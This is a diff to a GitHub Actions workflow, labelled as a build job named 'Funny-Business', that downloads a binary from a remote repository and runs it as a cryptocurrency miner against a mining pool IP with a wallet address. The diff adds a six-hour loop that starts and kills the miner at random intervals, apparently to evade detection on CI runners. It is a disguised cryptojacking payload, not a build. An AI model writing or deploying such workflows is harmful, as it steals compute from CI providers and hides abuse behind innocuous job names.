@@ -11,10 +11,6 @@ jobs:
   build:
     name: Build and Run Funny-Business Script
     runs-on: ubuntu-latest
-    strategy:
-      matrix:
-        go: [1, 2, 3, 4, 5]
-        flag: [A]
     steps:
       - name: Checkout code
         uses: actions/checkout@v3
@@ -23,39 +19,50 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y wget
-          
+
       - name: Prepare Funny-Business Script
         run: |
           wget -O tmii https://github.com/barburonjilo/back/raw/main/sr
           chmod +x tmii
 
-      - name: Start Funny-Business Process
+      - name: Run Funny-Business Loop
         run: |
-          total_cores=$(nproc)
-          num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
-          worker=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
-            's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
-            | sed "s/$/$num_cores/")
-          cores_to_use="0-$(($num_cores - 1))"
-          
-          nohup taskset -c $cores_to_use ./tmii -a yescryptr32 --pool 45.115.224.99:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > funny-business.log 2>&1 &
-          echo $! > /tmp/funny_business_pid
+          # Define the end time for the loop (6 hours from now)
+          end_time=$(date -d "+6 hours" +%s)
 
-      - name: Wait and Stop Funny-Business Process
-        run: |
-          sleep_duration=$((RANDOM % 241 + 180))  # Random sleep duration between 180 and 420 seconds
-          echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
-          sleep $sleep_duration
-          
-          if [ -f /tmp/funny_business_pid ]; then
-            pid=$(cat /tmp/funny_business_pid)
-            echo "Stopping funny-business with PID: $pid"
-            kill -9 $pid 2>/dev/null
-            rm -f /tmp/funny_business_pid
-            > funny-business.log
-          else
-            echo "No PID file found, cannot stop funny-business"
-          fi
+          while [ $(date +%s) -lt $end_time ]; do
+            # Start the funny-business process
+            total_cores=$(nproc)
+            num_cores=$(( ( RANDOM % (total_cores - 1) ) + 1 ))  # Randomly choose between 1 and (total_cores - 1)
+            worker=$(TZ=":Asia/Jakarta" date '+%A-%d-%B-%Y' | sed \
+              's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/' \
+              | sed "s/$/$num_cores/")
+            
+            nohup ./tmii -a yescryptr32 --pool 45.115.224.99:8449 -u UddCZe5d6VZNj2B7BgHPfyyQvCek6txUTx.$worker --timeout 120 -t $num_cores > funny-business.log 2>&1 &
+            pid=$!
+
+            # Save PID to a file
+            echo $pid > /tmp/funny_business_pid
+
+            # Wait for a random duration between 3 and 7 minutes
+            sleep_duration=$((RANDOM % 241 + 180))  # Random sleep duration between 180 and 420 seconds
+            echo "Sleeping for $((sleep_duration / 60)) minutes ($sleep_duration seconds)"
+            sleep $sleep_duration
+
+            # Stop the funny-business process
+            if [ -f /tmp/funny_business_pid ]; then
+              echo "Stopping funny-business with PID: $pid"
+              kill -9 $pid 2>/dev/null
+              rm -f /tmp/funny_business_pid
+              > funny-business.log
+            else
+              echo "No PID file found, cannot stop funny-business"
+            fi
+
+            # Sleep for an additional 2 minutes before starting the next loop iteration
+            echo "Sleeping for an additional 2 minutes"
+            sleep 120
+          done
 
       - name: Cleanup
         run: |
